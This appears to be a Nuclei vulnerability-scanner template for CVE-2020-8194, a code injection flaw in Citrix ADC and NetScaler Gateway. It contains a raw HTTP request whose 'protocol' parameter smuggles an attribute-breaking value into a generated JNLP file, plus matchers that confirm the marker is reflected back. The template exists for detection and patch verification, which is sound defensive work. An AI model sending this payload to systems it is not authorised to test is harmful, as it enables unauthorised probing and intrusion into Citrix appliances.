id: CVE-2020-8194

info:
  name: Citrix ADC and Citrix NetScaler Gateway - Remote Code Injection
  author: dwisiswant0
  severity: medium
  description: Citrix ADC and NetScaler Gateway are susceptible to remote code injection. An attacker can potentially execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials. Affected versions are before 13.0-58.30, 12.1-57.18, 12.0-63.21, 11.1-64.14 and 10.5-70.18. Citrix SDWAN WAN-OP versions before 11.1.1a, 11.0.3d and 10.2.7 allow modification of a file download.
  remediation: |
    Apply the necessary security patches or updates provided by Citrix to mitigate this vulnerability.
  reference:
    - https://support.citrix.com/article/CTX276688
    - https://nvd.nist.gov/vuln/detail/CVE-2020-8194
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N
    cvss-score: 6.5
    cve-id: CVE-2020-8194
    cwe-id: CWE-94
    epss-score: 0.90775
    epss-percentile: 0.98542
    cpe: cpe:2.3:o:citrix:application_delivery_controller_firmware:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: citrix
    product: application_delivery_controller_firmware
  tags: cve,cve2020,citrix

http:
  - raw:
      - |
        GET /menu/guiw?nsbrand=1&protocol=nonexistent.1337">&id=3&nsvpx=phpinfo HTTP/1.1
        Host: {{Hostname}}
        Cookie: startupapp=st

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<jnlp codebase=\"nonexistent.1337\">"

      - type: word
        part: header
        words:
          - "application/x-java-jnlp-file"

      - type: status
        status:
          - 200
# digest: 4a0a004730450221008e18ba7d4c2e32d0f73d1647cf9f161bd007eed6513d0e57badd73330c4bbbfc02202246125e033d6ccaf0ef33eeae252e7c40449c4385db15dcf8af3fcd3c103cf6:922c64590222798bb761d5b6d8e72950